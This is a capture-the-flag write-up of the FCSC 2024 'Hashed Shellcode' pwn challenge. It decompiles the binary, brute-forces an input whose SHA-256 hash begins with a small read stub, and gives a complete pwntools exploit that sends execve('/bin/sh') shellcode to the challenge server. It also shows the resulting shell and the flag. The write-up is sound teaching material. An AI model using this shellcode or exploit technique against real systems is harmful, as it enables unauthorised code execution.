# FCSC 2024 : Hashed Shellcode

# Challenge

Hashed Shellcode was a shellcoding pwn challenge from FCSC 2024, here's a summary:
- 2 stars
- 15 solves
- 464 points
- Author: Cryptanalyse
> Vous aviez aimé Encrypted Shellcode du FCSC 2021 ? Devinez quoi ? Voici la version avec du hachage !
> Note : l'image de base Docker sur le service distant est debian:bookworm-slim.

We are given the binary `hashed-shellcode`

---
# Setup

I will use [gef](https://github.com/bata24/gef) (bata24's fork) for this challenge, [Ghidra](https://ghidra-sre.org/) to decompile the binary and [pwntools](https://github.com/Gallopsled/pwntools) for my python exploit.

---
# Analysis

```
$ checksec --file ./hashed-shellcode
[...]
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
```
No rwx segment ? It's probably mprotecting it at runtime...

The binary is stripped, but it only have 1 function (main), we can find it by looking at the first argument of the call to `__libc_start_main` in the entrypoint.
The code produced by Ghidra is very ugly so I modified it a bit:
```C
int main(void) {
    int success;
    size_t size;
    char *success_;
    long in_FS_OFFSET;
    int i;
    size_t length;
    SHA256_CTX ctx;

    success = mprotect(&shellcode_page, 0x1000, 7); // RWX
    if (success != 0) {
        perror("mprotect");
        exit(1);
    }
    invalid_chars = 0;
    do {
        while (true) {
            puts("Input:");
            memset(shellcode, 0, 0x20);
            size = read(0, shellcode, 0x20);
            if ((long)size < 1) {
                perror("read");
                exit(1);
            }
            length = size;
            if ((&DAT_0010403f)[size] == '\n') {
                length = size - 1;
                (&DAT_0010403f)[size] = 0;
            }
            // Very ugly but it basically set invalid_chars to the length of the input.
            // Our input needs to start with "FCSC_".
            invalid_chars = (((((length + invalid_chars) - 
                            (long)(int)(uint)(shellcode == 'F')) -
                            (long)(int)(uint)(&shellcode[1] == 'C')) -
                            (long)(int)(uint)(&shellcode[2] == 'S')) -
                            (long)(int)(uint)(&shellcode[3] == 'C')) -
                            (long)(int)(uint)(&shellcode[4] == '_');
                          
            // It then checks for invalid characters, our input must contain those charachters:
            for (i = 5; (long)i < (long)length; i = i + 1) {
                success_ = strchr("0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}", (uint)(byte)shellcode[i]);
                if (success_ != (char *)0x0) {
                    invalid_chars -= 1;
                }
            }
            if (invalid_chars < 1)
                break;
            printf("Invalid input, retry! %ld\n", invalid_chars);
            invalid_chars = 0;
        }
        SHA256_Init(&ctx); // Hash our shellcode
        SHA256_Update(&ctx, shellcode, length);
        SHA256_Final((uchar *)shellcode, &ctx);
        shellcode(); // call the shellcode
    } while (valid_chars != 0);
    return 0;
}
```
The program first mprotect the shellcode page with read/write/execute protections. It reads 0x20 bytes and performs various check, the input must starts with `FCSC_` and can only contain valid characters:
``0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}``
Examples:
- `FCSC_WGlGe@egW\VQ4cSf@_LLsdu8xWx`
- `FCSC_dCL2e`
- `FCS`

---
# The exploit

##### Making a shellcode

Let's put a breakpoint on `call rdx` (used to jump to our hashed shellcode) and try different inputs.

```C
Input:
FCSC_AAAAAAAAAAAAAAAAAAAAAAAAAAA
gef> x/32xb $rdx
0x555555558040: 0xac    0x67    0xe9    0x40    0x4d    0x71    0x49    0x22
0x555555558048: 0x9b    0x13    0x8d    0xc3    0xc4    0xe2    0x69    0xb8
0x555555558050: 0x96    0x0b    0x3b    0x17    0xab    0xc1    0xd4    0xfc
0x555555558058: 0xa9    0x54    0x97    0x53    0x2b    0xf7    0xa9    0x68
```
```C
Input:
FCSC_AAAAAAAAAAAAAAAAAAAAAAAAAAB
gef> x/32xb $rdx
0x555555558040: 0x8f    0x2c    0x38    0x21    0x66    0x85    0x69    0x42
0x555555558048: 0xc9    0x96    0x91    0x07    0x42    0x6a    0x42    0x46
0x555555558050: 0x11    0x28    0x9b    0xd6    0x54    0x0a    0x65    0x6c
0x555555558058: 0x9b    0x28    0xa3    0x74    0xb3    0x3a    0x02    0x60
```
Everything changed.. We cannot build our shellcode by putting together multiple instruction.
Like I said earlier, the shellcode page have `RWX` protections, we don't need to directly input a `execve("/bin/sh", 0, 0)` shellcode, we can just input a `read()` shellcode to extends our old shellcode without filtering nor hashing.

##### Bruteforce

So we'll have to bruteforce a hash that starts with our shellcode.
Let's have a look to the registers just before the `call rdx` instruction:
```python
$rax   : 0x0000000000000000
$rdi   : 0x0000000000000000
$rsi   : 0x0000000000000000
$rdx   : 0x0000555555558040  <- start of shellcode
$rsp   : 0x00007fffffffe0f0
```

- `rax` is already 0, perfect for a `read` syscall.
- `rdi` (file descriptor) is already 0, `read` will read from `stdin`.
- `rsi` needs to point to our shellcode
- `rdx` will be the number of bytes to read, 0x555555558040 is more than enough.

Our shellcode needs to move `rdx` into `rsi` and syscall, we'll have to make it as small as possible to bruteforce it faster.

```asm
mov rsi, rdx
syscall
```
Gives us `48 89 D6 0F 05`, we can make it smaller by pushing `rdx` on the stack and then popping it into `rsi`.
```asm
push rdx
pop rsi
syscall
```
We get `52 5E 0F 05`. A 3 bytes long one may be possible with some obscure instructions but 4 bytes is enough.
Time to write a python script to bruteforce an input that will produce a hash that starts with `52 5E 0F 05`.
```py
from pwn import *
import random as rnd
from hashlib import *

context.arch = "amd64"
context.word_size = 64

code = asm("""
push rdx
pop rsi
syscall
""")

valid_chars = b"0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxy z{|}"
def random_string(length):
    return "".join([chr(rnd.choice(valid_chars)) for _ in range(length)]).encode()

while True:
    attempt = b"FCSC_" + random_string(0x20 - 5)
    attempt2 = sha256(attempt).digest()
    if attempt2.startswith(code):
        print(attempt)
        exit()
```
its long...
[image failed to load :(](https://i.imgflip.com/8mr1os.jpg)
really long...

I guess it's time to rewrite it in ~~Rust~~ C.
```C
#include <openssl/sha.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>

char shellcode[] = {0x52, 0x5e, 0x0f, 0x05};
char valid[] = "0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}";
unsigned int valid_size = sizeof(valid) / sizeof(valid[0]) - 1;

int main() {
    struct SHA256state_st ctx;
    srand(time(NULL));

    while (1) {
        char attempt[0x20] = "FCSC_";
        char attempt2[0x20];
        for (int i = 5; i <= sizeof(attempt); i++) {
            attempt[i] = valid[(unsigned int)rand() % valid_size];
        }

        SHA256_Init(&ctx);
        SHA256_Update(&ctx, attempt, sizeof(attempt));
        SHA256_Final(attempt2, &ctx);

        if (memcmp(shellcode, attempt2, sizeof(shellcode)) == 0) {
            puts("found:");
            write(0, attempt, 0x20);
            putchar('\n');
        }
    }
}
```
I ran 4 of them at the same time and it found an input in about 10 minutes if I remember correctly.
```
$ ./bruteforce
found:
FCSC_9Sfzbv=oED?^0JVy0a>zxDz=xP=
```

If we try this input in `hashed-shellcode` we indeed get `52 5E 0F 05` and the program waits for our second payload, we can then send a simple `execve("/bin/sh", 0, 0)` shellcode this time!
```asm
mov rax, 0x0068732f6e69622f // "/bin/sh\0"
push rax
mov rdi, rsp
xor esi, esi
xor edx, edx
mov eax, 0x3b
syscall
```

Here's the final exploit
```py
from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./hashed-shellcode"
args = []

io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2107)

def launch_local():
    global file, io
    pty = process.PTY
    io = process([file, *args], stdin=pty, stdout=pty)
    debug()

launch = launch_local
launch = launch_remote

launch()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = io.sendlineafter
sl = io.sendline
recv = io.recv
recvn = io.recvn
recvu = io.recvuntil

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)]

# Exploit goes here

read_shellcode = b"FCSC_9Sfzbv=oED?^0JVy0a>zxDz=xP=" # will start with push rdx; pop rsi; syscall after the hash
io.send(read_shellcode)
sleep(speed)

shellcode = asm(
"""
mov rax, 0x0068732f6e69622f
push rax
mov rdi, rsp
xor esi, esi
xor edx, edx
mov eax, 0x3b
syscall
""")

sl(b"A"*4 + shellcode) # four "A" to overwrite the old shellcode

io.interactive()
input("end")
exit()
```

```
$ python exploit.py
[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2107: Done
[*] Switching to interactive mode
Input:
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
FCSC{2bf3a8c59da61d5dd3ff402cb1ff11e0858246853297646bd1ad40bd944d8814}
```

---
# Conclusion
Thanks for reading this writeup, I hope you liked it.
Thanks you for this challenge, I never really did shellcoding challenges before that one. 